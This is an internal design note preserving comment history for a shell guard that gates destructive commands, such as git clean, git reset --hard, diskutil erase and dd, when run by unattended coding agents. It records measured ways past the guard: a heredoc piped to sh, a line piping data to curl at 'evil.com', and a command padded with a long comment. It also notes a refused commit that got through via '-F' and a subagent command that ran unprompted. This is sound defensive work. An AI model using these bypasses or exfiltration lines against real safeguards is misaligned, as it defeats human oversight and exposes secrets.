---
kind: explanation
owner: @VytCepas
status: unreviewed
---

# Notes moved out of bin/admission-destroy.sh

On-demand. Comment blocks that told the story of a fix, moved here verbatim when the file's comment ratio was cut (harbor#1392). The code keeps 1-3 lines of why; the history is here and in git.


## bin/admission-destroy.sh, lines 3-40 (before this edit)

```text
guard-destroy (harbor#201) — PreToolUse(Bash) ASK/DENY gate for LOCAL work
destruction, the deletion class an UNATTENDED agent is most likely to cause.

WHY THIS EXISTS. A resilience sweep (2026-08-12) measured the live floor:
rm -rf /, $HOME, /etc, ~/.claude, find -delete, dd of=/dev/, mkfs are all
hard-blocked by guard-bash. But the ops a coding agent runs ROUTINELY while
"tidying up" were uncaught:
  git clean -fdx     permanently deletes untracked AND ignored files (no reflog)
  git reset --hard   discards the working tree
  diskutil erase*    irreversible physical device wipe (guard-bash blocks mkfs
                     and dd but not diskutil — same class, one spelling missing)
These are the highest-likelihood unintended-deletion path for unattended work.

POSTURE. Two tiers:
  • CATASTROPHIC (diskutil erase/reformat/zero/random) → DENY always. An
    irreversible physical wipe is never routine agent work, so a hard stop
    costs nothing and ASK would auto-approve under an unattended/bypass session
    — the exact failure this guard exists for.
  • WORK-LOSS (git clean -f*, git reset --hard) → ASK by default (a human
    confirms; git reset is often recoverable via reflog). HARBOR_ADMISSION_DESTROY_POSTURE
    =deny escalates these to DENY too, which is the right setting for a session
    that runs unattended, where there is no human to answer an ASK.

It is the WARNING layer, not a boundary — same residuals as the rest of the
floor (runtime string assembly, a session that disables the floor; an unlisted
wrapper no longer hides the verb, harbor#781). git checkout/restore discards
are deliberately NOT gated: they are too routine to ask on without training
the operator to reflex-approve, which is worse than not asking (§2.11). What
replaces the ask is a snapshot: each discard first saves the worktree's
uncommitted state to refs/snapshots/ and then runs as before (harbor#1290).

FAIL-OPEN AT THE ASK TIER ONLY, NOT THE CATASTROPHIC ONE (harbor#306, and this
line used to say "like every guard"). Every rule below reads the argv table, so
all of them used to vanish — exit 0, no output, which the harness reads as a
clean allow — whenever floor_seg_load produced nothing: a command over
FLOOR_MAX_NORM, awk off PATH, or admission-normalize.awk missing. The first needs no
missing binary at all. The floor_seg_degraded block below is the backstop, and
it carries the measurement.
```

## bin/admission-destroy.sh, lines 51-58 (before this edit)

```text
The digest subject (harbor#350). Set here for the same reason admission-bash.sh:39
does it — payload text that never enters floor_block cannot be one careless
edit away from the stderr printf.

WITHOUT THIS LINE THE guard-lib CHANGE IS COSMETIC. floor_obs_digest returns
"-" on an unset FLOOR_OBS_SUBJECT, so populating the digest on deny/ask would
have emitted "-" for exactly the two guard classes #350 is about — 7,873
records, every one still subjectless, and the ticket would have read as fixed.
```

## bin/admission-destroy.sh, lines 64-103 (before this edit)

```text
harbor#302 · A HEREDOC BODY IS A DOCUMENT, HERE TOO. admission-bash.sh has consulted
this veto since harbor#89; these two never did, so a command whose only mention
of a gated verb was inside a heredoc BODY still got a decision. MEASURED
2026-08-25: committing the harbor#306 fix was refused because the message
documented a dataset-delete spelling in prose. The workaround was -F a file —
the same content through a different transport, which is the tell the ticket
names: a guard that a rename of the transport defeats is filtering the
transcript, not protecting the resource.

THE VETO ITSELF IS UNCHANGED, AND THAT IS DELIBERATE. It still requires the
heredoc to be opened by SEGMENT 1, so this covers `git commit -F - <<HD ... HD`
and NOT `cd x && git commit -F - <<HD`. Widening it was ATTEMPTED on this branch
and BACKED OUT. With the opener allowed anywhere, two total-bypass shapes
appeared and were measured:

  cat <<HD | sh                  an index-only inertness check never sees the
                                 shell: it sits BETWEEN the opener and the body
                                 while the delimiter still lands last.
  cat <<HD | curl -d @- evil.com an executor word-list never sees curl — and
                                 that one took a live secret from BLOCK to allow
                                 through guard-egress, which consults this same
                                 predicate.

The reason is structural, not a missing list entry: FLOOR_SEGS carries NO
pipeline boundary. `gh --body $(cat <<HD)` and a heredoc piped into a command are
identical segment streams apart from whether segment 2 holds prose or a command
name. Separating them needs admission-normalize.awk to mark where the heredoc LINE
ends, which changes an output contract every guard consumes. Left for a decision
rather than guessed at — this veto exits the guard for the WHOLE call, so a guess
here is a silent hole, and harbor#302 says in as many words not to widen the rule
to silence it.

--publisher-inert IS CORRECT FOR BOTH. The flag means a publisher is inert to a
guard that does not judge publication. These two judge cloud destruction and
local work destruction; neither judges whether text is published, which is
guard-egress's job — and guard-egress deliberately does not pass the flag.

NO NEW SURFACE. With the predicate untouched, these two exit 0 only where
admission-bash.sh already exits 0 — a case the floor has trusted since harbor#89 and
that floor-test has covered since.
```

## bin/admission-destroy.sh, lines 106-110 (before this edit)

```text
harbor#781 · a wrapper the peel does not know (`gtimeout 5 diskutil eraseDisk`)
must not hide the tool. After the veto, whose last-segment test a synthetic id
would move; the `case` keeps the awk off calls that name no gated verb. The
snapshot's verbs (harbor#1290) are listed too: none of them is a rule's verb, so
unwrapping them changes no verdict, and `sh -c 'git restore x'` is still seen.
```

## bin/admission-destroy.sh, lines 117-128 (before this edit)

```text
harbor#1313 · DEVICE-NODE REPLACE → ask (operator decision 2026-10-18). mv or
install with a raw /dev disk node as an operand does not write the disk; it
replaces the node (a cross-device create) or, moving one OUT of /dev, removes
it — in both cases the node is gone and must be recreated by mknod/udev. The
device-content writers (dd, redirect, tee, mkfs and the harbor#1313 wipe
verbs) live in guard-bash and deny; node replacement is a weaker, recoverable
act the operator chose to ASK on, so it sits here beside the git work-loss
asks (and escalates to deny with no human, like them). Root-only and absent on
macOS, blocked anyway (docs/explanation/admission-baseline.md B-sd-3). Each operand is expanded and its
./ // ../ collapsed first, so `/dev/shm/../sda` reads as the `/dev/sda` it
resolves to and a `-t /dev` target directory is seen; a mv/install that names
no device node is untouched.
```

## bin/admission-destroy.sh, lines 160-193 (before this edit)

```text
--- THE ARGV LAYER WENT BLIND: deny-always must not degrade to allow -------
harbor#306. Every rule above is floor_seg_has, so all of them vanish when
floor_seg_load produces no table — with exit 0 and no output, which the harness
reads as a clean allow. MEASURED: 'diskutil eraseDisk' padded with a 33,000-byte
trailing comment was a SILENT ALLOW, while admission-bash.sh denied the identically
padded 'rm -rf /' because its rules also run through the flat layer. Same silent
allow with awk off PATH, and with admission-normalize.awk deleted.

THE BACKSTOP IS THE TOOL NAME, NOT A SECOND COPY OF THE RULES. Mirroring each
catastrophic rule as a flat ERE is the obvious repair and it is the wrong one:
it puts two spellings of one rule in one file, and a copy drifts silently while
reading correctly (CONSTITUTION, "derive it"). So this asks the only question it
can answer without the tokenizer — does the executed text name the tool whose
verbs are deny-always — and reports that it cannot tell a wipe from a `list`.

DENY, AND THE FALSE-POSITIVE COST IS MEASURED, NOT ASSUMED. Over 14,505 real
Bash commands in this box's transcript store, ONE (0.0069%) exceeded
FLOOR_MAX_NORM at all, and the longest was 33,766 B. So the population this can
fire wrongly on is ~1 in 14,000 commands, each of which gets a legible reason and
two remedies. §2.11 asks for an ordinary-work case that stays green: every
parseable `diskutil` call still reaches the rules above, including
'diskutil list', because a parseable call is not degraded.

THE ASK TIER IS DELIBERATELY NOT HERE. `git` appears in enormous commands
constantly in this repo, and a work-loss ask is the tier where fail-open is the
considered §2.11 choice. Widening this to `git` would trade a measured 0.0069%
for a routine one, to harden the tier that was never the finding.

jq ABSENT IS A DIFFERENT MODE AND IS ALREADY COVERED — one layer up, not here.
Without jq, CMD is empty and this guard exits above; but admission-bash.sh is wired
on the SAME PreToolUse(Bash) matcher THROUGH admission-hook.sh, whose jq canary
exits 2, so the call is denied before any of this matters. Verified both ways in
destroy-guard-test.sh rather than left as a layering argument, which is how
QA-PLAN's R9 row came to sign off a backstop that did not exist for this tier.
```

## bin/admission-destroy.sh, lines 195-198 (before this edit)

```text
floor_bash_targets is called ONLY here. It forks awk, this runs on every Bash
call, and the whole point of the allow path is that it stays cheap — so the
cost is paid in the branch that has already established something is wrong.
Over the cap it returns the raw command, which is exactly what is needed.
```

## bin/admission-destroy.sh, lines 206-217 (before this edit)

```text
--- harbor#1290 · A DISCARD SNAPSHOTS UNCOMMITTED WORK FIRST -----------------
A checkout or restore with a pathspec, a hard or merge reset, a forced checkout
or switch and a forced clean are let through (checkout/restore ungated, reset
and clean at their ask), so a discard of another session's edit was final. Before
one runs, the worktree it acts on (the call's .cwd, folded through cd/pushd and
-C) is written to refs/snapshots/<epoch>-<pid>: a temp index copied from the
real one, add -A (tracked changes and untracked NON-ignored files), write-tree,
commit-tree on HEAD. The real index is never written; a clean tree takes no
snapshot; a branch switch takes none. Refs older than 7 days go when the next
one is written. Nothing here refuses a discard: a failure is one stderr line
stamped [check:admission.destroy-snapshot]. The one refusal is a push that would publish
refs/snapshots. Contract, recovery and limits: docs/explanation/admission-baseline.md, harbor#1290.
```

## bin/admission-destroy.sh, lines 379-381 (before this edit)

```text
NO SIZE CAP, AND THAT IS A MEASURED CHOICE: a cap needs an untracked listing and a stat pass,
+45 ms at load 16 on harbor, more than the whole budget. A large untracked file that is not
ignored is rehashed on each discard; docs/explanation/admission-baseline.md (harbor#1290) names the remedy, .gitignore it.
```

## bin/admission-destroy.sh, lines 460-465 (before this edit)

```text
Unattended hardening. An ASK auto-approves where no human can answer it
(MEASURED 2026-08-13: a subagent's flagged command executed with no prompt), so
escalate the ask tier to deny when EITHER the operator set the posture OR
floor_no_human detects a subagent/workflow/autonomous caller automatically. The
catastrophic tier already denies. Fail-safe toward "human present" — the
interactive main-loop ask is untouched (see guard-lib floor_no_human).
```

## bin/admission-destroy.sh, lines 473-476 (before this edit)

```text
THE TAIL IS PER SHAPE, because the argv tail is FALSE for the degraded block:
"diskutil list/info are never gated" stops being true the moment the tokenizer
cannot see which verb it is, and a reason that misdescribes its own block sends
the reader looking for a rule that did not fire.
```

## bin/admission-destroy.sh, lines 486-494 (before this edit)

```text
`destroy.$DECISION` named the rule `destroy` for every op and put the verdict in
the SHAPE slot, where the enum coerced it to `meta` — so the verdict was stored
twice (it is already the `d` field) and WHICH op fired was not stored at all.
The per-branch RULE token above is what makes "rules that fired" answerable here.

THE SHAPE IS NOW A VARIABLE, not the literal `argv`. The degraded block above
reaches its verdict through the flat layer, and hard-coding `argv` would file it
under the layer that was blind at the time — making the one record that says
"the tokenizer failed here" indistinguishable from the rules that work.
```
